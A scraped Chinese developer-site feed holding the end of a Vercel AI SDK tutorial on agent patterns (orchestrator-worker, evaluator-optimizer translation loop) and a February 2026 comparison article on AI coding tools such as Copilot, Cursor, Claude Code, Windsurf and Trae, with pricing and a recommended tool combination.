      // 针对不同的修改类型，定制 System Prompt
      <span class="hljs-keyword">const</span> workerSystemPrompt = {
        <span class="hljs-attr">create</span>: <span class="hljs-string">'你是实现新文件的专家，遵循最佳实践和项目模式。'</span>,
        <span class="hljs-attr">modify</span>: <span class="hljs-string">'你是修改现有代码的专家，保持一致性并避免回退。'</span>,
        <span class="hljs-attr">delete</span>: <span class="hljs-string">'你是安全删除代码的专家，确保不破坏现有功能。'</span>,
      }[file.changeType];

      <span class="hljs-keyword">const</span> { <span class="hljs-attr">object</span>: change } = await <span class="hljs-title function_ invoke__">generateObject</span>({
        model,
        <span class="hljs-attr">schema</span>: z.<span class="hljs-keyword">object</span>({
          <span class="hljs-attr">explanation</span>: z.<span class="hljs-keyword">string</span>(),
          <span class="hljs-attr">code</span>: z.<span class="hljs-keyword">string</span>(),
        }),
        system: workerSystemPrompt,
        prompt: `为 ${file.filePath} 实现变更以支持：
        ${file.purpose}
        
        考虑整体功能上下文：
        ${featureRequest}`,
      });

      <span class="hljs-keyword">return</span> {
        file,
        implementation: change,
      };
    })
  );

  <span class="hljs-keyword">return</span> {
    plan: implementationPlan,
    changes: fileChanges,
  };
}
</code></pre>
<hr/>
<h2 data-id="heading-5">5. 评估-优化循环 (Evaluator-Optimizer)</h2>
<p>这是一种“自愈”模式。模型生成结果后，自己（或另一个模型）进行评估。如果不达标，则根据反馈进行优化，直到满足条件或达到最大重试次数。</p>
<p><strong>场景</strong>：文学翻译。翻译 -&gt; 评分 -&gt; (如果不完美) 根据意见修正 -&gt; 再次评分。</p>
<p>TypeScript</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">import</span> { generateText, generateObject } <span class="hljs-keyword">from</span> <span class="hljs-string">'ai'</span>;
<span class="hljs-keyword">import</span> { z } <span class="hljs-keyword">from</span> <span class="hljs-string">'zod'</span>;
<span class="hljs-keyword">import</span> { anthropic } <span class="hljs-keyword">from</span> <span class="hljs-string">'@ai-sdk/anthropic'</span>;

<span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">translateWithFeedback</span>(<span class="hljs-params">text: <span class="hljs-built_in">string</span>, targetLanguage: <span class="hljs-built_in">string</span></span>) {
  <span class="hljs-keyword">const</span> model = <span class="hljs-title function_">anthropic</span>(<span class="hljs-string">'claude-3-5-sonnet-20240620'</span>);
  
  <span class="hljs-keyword">let</span> currentTranslation = <span class="hljs-string">''</span>;
  <span class="hljs-keyword">let</span> iterations = <span class="hljs-number">0</span>;
  <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">MAX_ITERATIONS</span> = <span class="hljs-number">3</span>; <span class="hljs-comment">// 防止死循环</span>

  <span class="hljs-comment">// 1. 初始翻译</span>
  <span class="hljs-keyword">const</span> { <span class="hljs-attr">text</span>: translation } = <span class="hljs-keyword">await</span> <span class="hljs-title function_">generateText</span>({
    model,
    <span class="hljs-attr">system</span>: <span class="hljs-string">'你是一位专业的文学翻译家。'</span>,
    <span class="hljs-attr">prompt</span>: <span class="hljs-string">`将此文本翻译成 <span class="hljs-subst">${targetLanguage}</span>，保留语气和文化细微差别：
    <span class="hljs-subst">${text}</span>`</span>,
  });

  currentTranslation = translation;

  <span class="hljs-comment">// 2. 评估-优化 循环</span>
  <span class="hljs-keyword">while</span> (iterations &lt; <span class="hljs-variable constant_">MAX_ITERATIONS</span>) {
    <span class="hljs-comment">// 评估当前翻译</span>
    <span class="hljs-keyword">const</span> { <span class="hljs-attr">object</span>: evaluation } = <span class="hljs-keyword">await</span> <span class="hljs-title function_">generateObject</span>({
      model,
      <span class="hljs-attr">schema</span>: z.<span class="hljs-title function_">object</span>({
        <span class="hljs-attr">qualityScore</span>: z.<span class="hljs-title function_">number</span>().<span class="hljs-title function_">min</span>(<span class="hljs-number">1</span>).<span class="hljs-title function_">max</span>(<span class="hljs-number">10</span>),
        <span class="hljs-attr">preservesTone</span>: z.<span class="hljs-title function_">boolean</span>(),
        <span class="hljs-attr">preservesNuance</span>: z.<span class="hljs-title function_">boolean</span>(),
        <span class="hljs-attr">culturallyAccurate</span>: z.<span class="hljs-title function_">boolean</span>(),
        <span class="hljs-attr">specificIssues</span>: z.<span class="hljs-title function_">array</span>(z.<span class="hljs-title function_">string</span>()),
        <span class="hljs-attr">improvementSuggestions</span>: z.<span class="hljs-title function_">array</span>(z.<span class="hljs-title function_">string</span>()),
      }),
      <span class="hljs-attr">system</span>: <span class="hljs-string">'你是一位文学翻译评估专家。'</span>,
      <span class="hljs-attr">prompt</span>: <span class="hljs-string">`评估此翻译：
      
      原文：<span class="hljs-subst">${text}</span>
      翻译：<span class="hljs-subst">${currentTranslation}</span>
      
      请考虑：整体质量、语气保留、细微差别、文化准确性。`</span>,
    });

    <span class="hljs-comment">// 检查是否达到高质量标准</span>
    <span class="hljs-keyword">if</span> (
      evaluation.<span class="hljs-property">qualityScore</span> &gt;= <span class="hljs-number">8</span> &amp;&amp;
      evaluation.<span class="hljs-property">preservesTone</span> &amp;&amp;
      evaluation.<span class="hljs-property">preservesNuance</span> &amp;&amp;
      evaluation.<span class="hljs-property">culturallyAccurate</span>
    ) {
      <span class="hljs-keyword">break</span>; <span class="hljs-comment">// 质量达标，跳出循环</span>
    }

    <span class="hljs-comment">// 根据反馈生成改进后的翻译</span>
    <span class="hljs-keyword">const</span> { <span class="hljs-attr">text</span>: improvedTranslation } = <span class="hljs-keyword">await</span> <span class="hljs-title function_">generateText</span>({
      model,
      <span class="hljs-attr">system</span>: <span class="hljs-string">'你是一位专业的文学翻译家。'</span>,
      <span class="hljs-attr">prompt</span>: <span class="hljs-string">`根据以下反馈改进此翻译：
      <span class="hljs-subst">${evaluation.specificIssues.join(<span class="hljs-string">'\n'</span>)}</span>
      <span class="hljs-subst">${evaluation.improvementSuggestions.join(<span class="hljs-string">'\n'</span>)}</span>
      
      原文：<span class="hljs-subst">${text}</span>
      当前翻译：<span class="hljs-subst">${currentTranslation}</span>`</span>,
    });

    currentTranslation = improvedTranslation;
    iterations++;
  }

  <span class="hljs-keyword">return</span> {
    <span class="hljs-attr">finalTranslation</span>: currentTranslation,
    <span class="hljs-attr">iterationsRequired</span>: iterations,
  };
}
</code></pre>
<hr/>
<h2 data-id="heading-6">总结：如何选择？</h2>



































<table><thead><tr><th><strong>模式</strong></th><th><strong>适用场景</strong></th><th><strong>核心优势</strong></th></tr></thead><tbody><tr><td><strong>顺序处理</strong></td><td>只有一条路径的任务</td><td>简单、易维护</td></tr><tr><td><strong>路由</strong></td><td>输入类型多样的任务</td><td>针对性强、可优化成本</td></tr><tr><td><strong>并行处理</strong></td><td>任务可拆分独立的子任务</td><td>速度快、多视角分析</td></tr><tr><td><strong>编排者-执行者</strong></td><td>复杂、多步骤、动态子任务</td><td>处理复杂系统工程能力强</td></tr><tr><td><strong>评估-优化</strong></td><td>对质量要求极高的任务</td><td>自我纠错、结果更可靠</td></tr></tbody></table>
<p>Vercel AI SDK 通过 <code>generateText</code> 和 <code>generateObject</code> 这两个基础 API，配合 <code>zod</code> 的结构化能力，让实现这些高级模式变得非常简单（且类型安全！）。</p>
<p>希望这篇教程能帮你在项目中构建更强大的 AI Agent！🚀</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[2026 年 AI 编程工具横评：Copilot / Cursor / Claude Code / Windsurf / Trae，到底该用哪个？（附组合方案）]]></title>    <link>https://juejin.cn/post/7605494530017280040</link>    <guid>https://juejin.cn/post/7605494530017280040</guid>    <pubDate>2026-02-12T12:35:17.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7605494530017280040" data-draft-id="7605539194690093056" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="2026 年 AI 编程工具横评：Copilot / Cursor / Claude Code / Windsurf / Trae，到底该用哪个？（附组合方案）"/> <meta itemprop="keywords" content="AI编程"/> <meta itemprop="datePublished" content="2026-02-12T12:35:17.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="HelloDong"/> <meta itemprop="url" content="https://juejin.cn/user/3896324937767613"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            2026 年 AI 编程工具横评：Copilot / Cursor / Claude Code / Windsurf / Trae，到底该用哪个？（附组合方案）
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3896324937767613/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    HelloDong
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-12T12:35:17.000Z" title="Thu Feb 12 2026 12:35:17 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-12
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读8分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{color:#595959;font-size:15px;font-family:-apple-system,system-ui,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei,Arial,sans-serif;background-image:linear-gradient(90deg,rgba(60,10,30,.04) 3%,transparent 0),linear-gradient(1turn,rgba(60,10,30,.04) 3%,transparent 0);background-size:20px 20px;background-position:50%}.markdown-body p{color:#595959;font-size:15px;line-height:2;font-weight:400}.markdown-body p+p{margin-top:16px}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{padding:30px 0;margin:0;color:#135ce0}.markdown-body h1{position:relative;text-align:center;font-size:22px;margin:50px 0}.markdown-body h1:before{position:absolute;content:"";top:-10px;left:50%;width:32px;height:32px;transform:translateX(-50%);background-size:100% 100%;opacity:.36;background-repeat:no-repeat;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAMAAABEpIrGAAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAABfVBMVEX///8Ad/8AgP8AgP8AgP8Aff8AgP8Af/8AgP8AVf8Af/8Af/8AgP8AgP8Af/8Afv8AAP8Afv8Afv8Aef8AgP8AdP8Afv8AgP8AgP8Acf8Ae/8AgP8Af/8AgP8Af/8Af/8AfP8Afv8AgP8Af/8Af/8Afv8Afv8AgP8Afv8AgP8Af/8Af/8AgP8AgP8Afv8AgP8Af/8AgP8AgP8AgP8Ae/8Afv8Af/8AgP8Af/8AgP8Af/8Af/8Aff8Af/8Abf8AgP8Af/8AgP8Af/8Af/8Afv8AgP8AgP8Afv8Afv8AgP8Af/8Aff8AgP8Afv8AgP8Aff8AgP8AfP8AgP8Ae/8AgP8Af/8AgP8AgP8AgP8Afv8AgP8AgP8AgP8Afv8AgP8AgP8AgP8AgP8AgP8Af/8AgP8Af/8Af/8Aev8Af/8AgP8Aff8Afv8AgP8AgP8AgP8Af/8AgP8Af/8Af/8AgP8Afv8AgP8AgP8AgP8AgP8Af/8AeP8Af/8Af/8Af//////rzEHnAAAAfXRSTlMAD7CCAivatxIDx5EMrP19AXdLEwgLR+6iCR/M0yLRzyFF7JupSXn8cw6v60Q0QeqzKtgeG237HMne850/6Qeq7QaZ+WdydHtj+OM3qENCMRYl1B3K2U7wnlWE/mhlirjkODa9FN/BF7/iNV/2kASNZpX1Wlf03C4stRGxgUPclqoAAAABYktHRACIBR1IAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAB3RJTUUH4gEaBzgZ4yeM3AAAAT9JREFUOMvNUldbwkAQvCAqsSBoABE7asSOBRUVVBQNNuy9996789+9cMFAMHnVebmdm+/bmdtbQv4dOFOW2UjPzgFyLfo6nweKfIMOBYWwFtmMPGz2Yj2pJI0JDq3udJW6VVbmKa9I192VQFV1ktXUAl5NB0cd4KpnORqsEO2ZIRpF9gJfE9Dckqq0KuZt7UAH5+8EPF3spjsRpCeQNO/tA/qDwIDA+OCQbBoKA8NOdjMySgcZGVM6jwcgRuUiSs0nlPFNSrEpJfU0jTLD6llqbvKxei7OzvkFNQohi0vAsj81+MoqsCaoPOQFgus/1LyxichW+hS2JWCHZ7VlF9jb187pIAYcHiViHAMnp5mTjJ8B5xeEXF4B1ze/fTh/C0h398DDI9HB07O8ci+vRBdvdGnfP4gBuM8vw7X/G3wDmFhFZEdxzjMAAAAldEVYdGRhdGU6Y3JlYXRlADIwMTgtMDEtMjZUMDc6NTY6MjUrMDE6MDA67pVWAAAAJXRFWHRkYXRlOm1vZGlmeQAyMDE4LTAxLTI2VDA3OjU2OjI1KzAxOjAwS7Mt6gAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAAWdEVYdFRpdGxlAGp1ZWppbl9sb2dvIGNvcHlxapmKAAAAV3pUWHRSYXcgcHJvZmlsZSB0eXBlIGlwdGMAAHic4/IMCHFWKCjKT8vMSeVSAAMjCy5jCxMjE0uTFAMTIESANMNkAyOzVCDL2NTIxMzEHMQHy4BIoEouAOoXEXTyQjWVAAAAAElFTkSuQmCC)}.markdown-body h2{position:relative;font-size:20px;border-left:4px solid;padding:0 0 0 10px;margin:30px 0}.markdown-body h3{font-size:16px}.markdown-body ul{list-style:disc outside;margin-left:2em;margin-top:1em}.markdown-body li{line-height:2;color:#595959}.markdown-body img.loaded{margin:0 auto;display:block}.markdown-body blockquote{background:#fff9f9;margin:2em 0;padding:2px 20px;border-left:4px solid #b2aec5}.markdown-body blockquote p{color:#666;line-height:2}.markdown-body a{color:#036aca;border-bottom:1px solid rgba(3,106,202,.8);font-weight:400;text-decoration:none}.markdown-body em strong,.markdown-body strong{color:#036aca}.markdown-body hr{border-top:1px solid #135ce0}.markdown-body pre{overflow:auto}.markdown-body code,.markdown-body pre{overflow:auto;position:relative;line-height:1.75;font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body table{border-collapse:collapse;margin:1rem 0;overflow-x:auto}.markdown-body table td,.markdown-body table th{border:1px solid #dfe2e5;padding:.6em 1em}.markdown-body table tr{border-top:1px solid #dfe2e5}.markdown-body table tr:nth-child(2n){background-color:#f6f8fa}</style><style data-highlight="" data-highlight-key="monokai-sublime">.markdown-body pre,.markdown-body pre&gt;code.hljs{background:#23241f}.hljs-subst,.hljs-tag,.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#f8f8f2}.hljs-emphasis,.hljs-strong{color:#a8a8a2}.hljs-bullet,.hljs-link,.hljs-literal,.hljs-number,.hljs-quote,.hljs-regexp{color:#ae81ff}.hljs-code,.hljs-section,.hljs-selector-class,.hljs-title{color:#a6e22e}.hljs-strong{font-weight:700}.hljs-emphasis{font-style:italic}.hljs-attr,.hljs-keyword,.hljs-name,.hljs-selector-tag{color:#f92672}.hljs-attribute,.hljs-symbol{color:#66d9ef}.hljs-class .hljs-title,.hljs-params{color:#f8f8f2}.hljs-addition,.hljs-built_in,.hljs-builtin-name,.hljs-selector-attr,.hljs-selector-id,.hljs-selector-pseudo,.hljs-string,.hljs-template-variable,.hljs-type,.hljs-variable{color:#e6db74}.hljs-comment,.hljs-deletion,.hljs-meta{color:#75715e}</style><h2 data-id="heading-0">2026 年 AI 编程工具横评：Copilot / Cursor / Claude Code / Windsurf / Trae，到底该用哪个？（附组合方案）</h2>
<blockquote>
<p>原文首发于公众号，欢迎关注获取更多 AI 开发实战干货。</p>
</blockquote>
<blockquote>
<p>85% 的开发者在用 AI 编程工具，41% 的代码由 AI 生成——但只有 3% 的开发者说自己"高度信任"AI 写的代码。这个矛盾说明了什么？说明大家都在用，但没几个人用对了。</p>
</blockquote>
<p><em>信息截止：2026 年 2 月</em></p>
<h3 data-id="heading-1">选择焦虑</h3>
<p>你大概也经历过这种场景：</p>
<p>朋友说"Cursor 太好用了，谁用谁知道"，你下了个试试；同事又说"Claude Code 改变了我写代码的方式"，你也开了个订阅；隔天刷到知乎热帖"Trae 免费薅字节的羊毛"，你又装了一个。</p>
<p>结果就是电脑里装了三四个 AI 编程工具，每个月交着几十美元的订阅费，但不确定自己到底在用哪个、该用哪个。</p>
<p>这篇文章不做功能罗列——官网都有。我要告诉你的是：<strong>每个工具到底擅长什么、不擅长什么、适合谁用</strong>，以及一个月花 46 美元就能覆盖所有场景的组合方案。</p>
<h3 data-id="heading-2">一张表看清核心差异</h3>
<p>先上对比表，后面再逐个拆解。</p>





















































<table><thead><tr><th>维度</th><th>Copilot</th><th>Cursor</th><th>Claude Code</th><th>Windsurf</th><th>Trae</th></tr></thead><tbody><tr><td><strong>一句话定位</strong></td><td>最快的补全</td><td>最懂项目的编辑器</td><td>最强的终端 Agent</td><td>免费的大仓库方案</td><td>国内免费之选</td></tr><tr><td><strong>基础价格</strong></td><td>$10/月</td><td>$16/月</td><td>$20/月</td><td>$15/月</td><td>国内免费</td></tr><tr><td><strong>核心优势</strong></td><td>速度 + 生态</td><td>多文件 + Composer</td><td>推理 + 自主能力</td><td>远程索引 + 跨 IDE</td><td>中文 + 零成本</td></tr><tr><td><strong>核心短板</strong></td><td>上下文窗口小</td><td>价格贵</td><td>不适合实时补全</td><td>性能占用高</td><td>复杂任务弱</td></tr><tr><td><strong>适合谁</strong></td><td>所有人的基础配置</td><td>全职写代码的人</td><td>要做架构级操作的人</td><td>百万行大仓库</td><td>初学者/国内开发者</td></tr></tbody></table>
<h3 data-id="heading-3">逐个拆解</h3>
<h4 data-id="heading-4">GitHub Copilot：你的第一个 AI 编程搭档</h4>
<p><strong>市占率 68%</strong>，几乎每个用过 AI 编程的人都用过 Copilot。它的核心价值就两个字：<strong>快</strong>和<strong>稳</strong>。</p>
<p>Tab 补全几乎零延迟，样板代码、API 调用模式这种重复性工作，Copilot 写得又快又好。2026 年 1 月上线的 <strong>Copilot Workspace</strong> 更进一步——从 GitHub Issue 自动生成方案、写代码、跑测试、提 PR，一条龙。</p>
<p><strong>但它有个致命短板：上下文窗口太小。</strong></p>
<p>当你需要理解整个项目结构、做跨多个文件的重构时，Copilot 经常"顾头不顾尾"——改了 A 文件忘了更新 B 文件的引用。66% 的开发者反映 Copilot 的建议是"几乎对但不完全对"，这个数据很能说明问题。</p>
<p><strong>定价</strong>：Free 版够尝鲜（2000 补全/月）；Pro 版 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>10</mn><mi mathvariant="normal">/</mi><mtext>月是性价比最高的入门方案；</mtext><mi>P</mi><mi>r</mi><mi>o</mi><mo>+</mo></mrow><annotation encoding="application/x-tex">10/月是性价比最高的入门方案；Pro+ </annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord">10/</span><span class="mord cjk_fallback">月是性价比最高的入门方案；</span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mord mathnormal">ro</span><span class="mord">+</span></span></span></span></span>39/月解锁 Claude Opus、o3 等高端模型。</p>
<p><strong>结论</strong>：Copilot 不应该是你唯一的工具，但应该是你组合方案里的基础层。$10/月的 Pro 版，用来处理日常补全和快速任务。</p>
<h4 data-id="heading-5">Cursor：写代码体验的天花板</h4>
<p>如果说 Copilot 是"会补全的插件"，Cursor 就是"会写代码的编辑器"。核心差距在<strong>项目级理解</strong>。</p>
<p>2025 年底发布的 <strong>Cursor 2.0</strong> 和自研的 <strong>Composer 模型</strong>是转折点——生成速度快了 4 倍，大多数交互在 30 秒内完成。更重要的是 Composer 的多文件编辑能力：你描述一个需求，它自动识别要改哪些文件、生成 diff、等你确认后统一应用。</p>
<p>举个例子：你说"把所有 API 路由从 Express 迁移到 Hono"，Cursor 能自动扫描所有路由文件，识别要修改的地方，保持类型签名一致，一次性给出所有改动的 diff。这种跨文件协调能力，目前 Copilot 做不到。</p>
<p>最近还上了<strong>多 Agent 并行</strong>——最多 8 个 Agent 同时工作，基于 Git worktree 隔离。一个 Agent 写前端组件，另一个写后端 API，第三个写测试用例，同时进行，互不干扰。</p>
<p><strong>但 Cursor 有两个问题让人犹豫：</strong></p>
<p>第一是<strong>价格</strong>。Pro 版 $16/月，比 Copilot 贵 60%。Free 版只有 25 信用额度，专业开发者 2-3 天就用完，基本等于没有。2025 年 6 月改成信用额度计费后，社区反弹很大——因为你很难预估这个月会花多少钱。</p>
<p>第二是<strong>性能</strong>。大项目下 CPU 占用能到 70-90%，长时间跑 Agent 偶尔崩溃。这对于以"编辑器体验"为卖点的工具来说，有点讽刺。</p>
<p><strong>结论</strong>：如果你每天写 4 小时以上代码，Cursor Pro 是值得的。多文件编辑和项目感知能力确实拉开了一个档次。但它不够"全能"——实时补全不如 Copilot 快，深度推理不如 Claude Code 强。</p>
<h4 data-id="heading-6">Claude Code：不在 IDE 里写代码的 AI</h4>
<p>Claude Code 和前面四个工具有本质区别——它是个<strong>终端工具</strong>，不是编辑器也不是插件。你在命令行里跟它对话，它直接读你的代码、改你的文件、跑你的测试、帮你提 PR。</p>
<p>这意味着 Claude Code 的使用场景和 Copilot/Cursor 完全不同。它不做实时补全，不嵌入你的编辑器，而是<strong>像一个远程工程师</strong>——你给它一个任务，它自己规划、自己执行。</p>
<p>2026 年 2 月刚发布的 <strong>Opus 4.6</strong> 带来了两个重磅更新：</p>
<p><strong>Agent Teams</strong>：多个 Claude Code 实例可以直接通信和协调。你说"重构这个支付模块"，它自己拆成子任务——一个实例改数据模型、一个改 API 层、一个改前端调用——并行执行后合并结果。这是目前唯一一个做到多 Agent 协同编码的工具。</p>
<p><strong>1M token 上下文窗口</strong>（Beta）：意味着它能一次性"看到"你整个代码库的大部分内容。做架构级的分析和重构时，这个上下文窗口大小是碾压级的。</p>
<p><strong>但 Claude Code 的门槛也最高：</strong></p>
<p>价格方面，Pro <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>20</mn><mi mathvariant="normal">/</mi><mtext>月只是起步，重度使用需要</mtext></mrow><annotation encoding="application/x-tex">20/月只是起步，重度使用需要 </annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord">20/</span><span class="mord cjk_fallback">月只是起步，重度使用需要</span></span></span></span></span>100-$200/月 的 Max 方案。学习曲线方面，命令行交互对很多开发者不够直观。而且它不替代 IDE——你还是需要一个 Cursor 或 VS Code 来写日常代码。</p>
<p><strong>结论</strong>：Claude Code 是"高端配置"，适合需要做架构级操作、复杂调试、大规模重构的场景。如果你的日常工作涉及大量"理解整个系统然后做决策"的场景，$20/月的 Pro 版已经能显著提效。</p>
<h4 data-id="heading-7">Windsurf：大仓库的救星</h4>
<p>Windsurf（前身 Codeium）的差异化很明确：<strong>远程索引</strong>。</p>
<p>如果你的项目是个百万行的单体仓库，Copilot 和 Cursor 在本地索引时可能卡得你想砸电脑。Windsurf 把索引放到云端，支持 100 万行以上的代码库，本地几乎不占资源。</p>
<p>它的 <strong>Cascade Agentic 助手</strong>也不错——深度上下文感知，支持多文件编辑，直接写入文件。另一个优点是<strong>跨 IDE 支持广</strong>：不只是 VS Code，JetBrains 全家桶（IntelliJ、WebStorm、PyCharm）、Vim/Neovim、甚至 Xcode 都支持。</p>
<p><strong>问题是"什么都行但什么都不拔尖"。</strong> 补全速度不如 Copilot，多文件编辑不如 Cursor，推理能力不如 Claude Code。界面响应也有延迟感，长时间跑 Agent 偶尔崩溃。</p>
<p><strong>定价</strong>：Free 版 25 信用额度/月（和 Cursor 一样紧张）；Pro 版 $15/月，比 Cursor 便宜一点。</p>
<p><strong>结论</strong>：如果你在一个百万行级的大仓库里工作，或者你的团队用 JetBrains IDE 不愿意换编辑器，Windsurf 是好选择。其他场景下，Cursor 或 Copilot 体验更好。</p>
<h4 data-id="heading-8">Trae：字节出品，国内开发者的零成本之选</h4>
<p>Trae 最大的卖点就是三个字：<strong>不要钱</strong>。</p>
<p>国内版集成了豆包 1.5 Pro 和 DeepSeek R1/V3，无限使用，不需要翻墙，不需要信用卡。6 个月月活破百万，字节内部 92% 的工程师在用。</p>
<p>它的 <strong>SOLO Builder 模式</strong>对初学者特别友好——你用中文描述"我要一个带支付功能的电商 Demo"，它自动生成项目结构、写代码、监控控制台报错并自动修复。从 0 到 1 搭项目的效率很高。</p>
<p><strong>但 Trae 的天花板也很明显：</strong></p>
<p>复杂任务容易出错——文件查找有时对不上，插件运行不够稳定。内存占用明显高于 VS Code 和 Cursor，笔记本上跑起来有卡顿感。响应速度和代码质量整体不如 Cursor。</p>
<p><strong>定价</strong>：国内版免费；国际版 $10/月；企业版 69 元/席位/月。</p>
<p><strong>结论</strong>：如果你是国内开发者，Trae 至少值得装一个当备选。初学者、学生、预算有限的独立开发者，用 Trae 就够了。但如果你是全职工程师处理复杂项目，还是需要 Cursor 或 Claude Code。</p>
<h3 data-id="heading-9">我的实战组合方案</h3>
<p>用了半年多，我的结论是：<strong>不存在一个工具能覆盖所有场景，组合使用才是最优解。</strong></p>

























<table><thead><tr><th>场景</th><th>工具</th><th>原因</th></tr></thead><tbody><tr><td>日常编码</td><td>Cursor</td><td>多文件感知 + Composer，写功能最高效</td></tr><tr><td>快速补全</td><td>Copilot</td><td>Tab 补全最快，样板代码一按就有</td></tr><tr><td>架构分析 / 复杂调试</td><td>Claude Code</td><td>推理质量最高，能理解整个系统</td></tr></tbody></table>
<p><strong>月费</strong>：Cursor Pro <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>16</mn><mo>+</mo><mi>C</mi><mi>o</mi><mi>p</mi><mi>i</mi><mi>l</mi><mi>o</mi><mi>t</mi><mi>P</mi><mi>r</mi><mi>o</mi></mrow><annotation encoding="application/x-tex">16 + Copilot Pro </annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"/><span class="mord">16</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"/><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mord mathnormal">o</span><span class="mord mathnormal">p</span><span class="mord mathnormal">i</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">o</span><span class="mord mathnormal" style="margin-right:0.13889em;">tP</span><span class="mord mathnormal">ro</span></span></span></span></span>10 + Claude Pro <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>20</mn><mo>=</mo><mo>∗</mo><mo>∗</mo></mrow><annotation encoding="application/x-tex">20 = **</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">20</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.4653em;"/><span class="mord">∗</span><span class="mord">∗</span></span></span></span></span>46/月**。</p>
